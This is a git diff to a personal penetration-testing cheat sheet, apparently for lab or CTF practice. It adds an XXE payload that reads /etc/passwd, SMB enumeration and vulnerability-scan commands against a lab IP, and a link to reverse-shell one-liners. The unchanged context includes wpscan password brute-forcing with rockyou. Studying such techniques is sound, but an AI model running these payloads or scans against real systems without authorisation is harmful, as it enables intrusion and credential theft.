@@ -72,6 +72,16 @@ wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 
 ```
 wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
 ```
+#### Example of XXE 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<comment>
+  <name>Joe Hamd</name>
+  <author>Barry Clad</author>
+  <com>&xxe;</com>
+</comment>
+```
 ---
 ###  Encoding techniques:
 - [splitbrain](https://www.splitbrain.org/_static/ook/)
@@ -130,7 +140,6 @@ It is a shell application to manage Windows system administrator applications.
 lusrmgr.msc
 ```
 </details>
-
 <details> <summary> System Configuration utility </summary>
 
 for diagnose startup issues
@@ -139,7 +148,6 @@ for diagnose startup issues
 MSConfig
 ```
 </details>
-
 <details> <summary> Task Manager </summary>
 
 to manage (enable/disable) startup items. 
@@ -147,7 +155,6 @@ to manage (enable/disable) startup items.
 taskmgr
 ```
 </details>
-
 <details> <summary> User Account Control </summary>
 helps prevent unauthorized changes (which may be initiated by applications, users, viruses, or other forms of malware) to an operating system
 
@@ -155,7 +162,6 @@ helps prevent unauthorized changes (which may be initiated by applications, user
 UserAccountControlSettings.exe
 ```
 </details>
-
 <details> <summary> Computer Management </summary>
 the process of managing, monitoring and optimizing a computer system for performance, availability, security
 
@@ -163,7 +169,6 @@ the process of managing, monitoring and optimizing a computer system for perform
 compmgmt
 ```
 </details>
-
 <details> <summary> System Information </summary> 
 (gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues.)
 
@@ -171,7 +176,6 @@ compmgmt
 msinfo32
 ```
 </details>
-
 <details> <summary> Resource Monitor </summary>
 displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules
 
@@ -179,7 +183,6 @@ displays per-process and aggregate CPU, memory, disk, and network usage informat
 resmon
 ```
 </details>
-
 <details> <summary> Windows Registry </summary>
 central hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices
 
@@ -187,11 +190,32 @@ central hierarchical database used to store information necessary to configure t
 regedit
 ```
 </details>
+<details> <summary> SMB discovery </summary>
+open SMB shares
 
+```
+smbclient -L 10.10.251.241
+```
+
+scan with nmap
+
+```
+nmap -p 139,445 -Pn -script smb-enum* 10.10.251.241
+nmap -p 139,445 -Pn -script smb-vuln* 10.10.251.241
+```
+
+connect with smbclient
+
+```
+smbclient \\\\10.10.251.241\\nt4wrksv
+```
+
+</details>
 ---
 
 ### links
 * [database with CVE exploits](https://cvexploits.io/)
 * [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
+* [reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 ---
 Happy hacking!
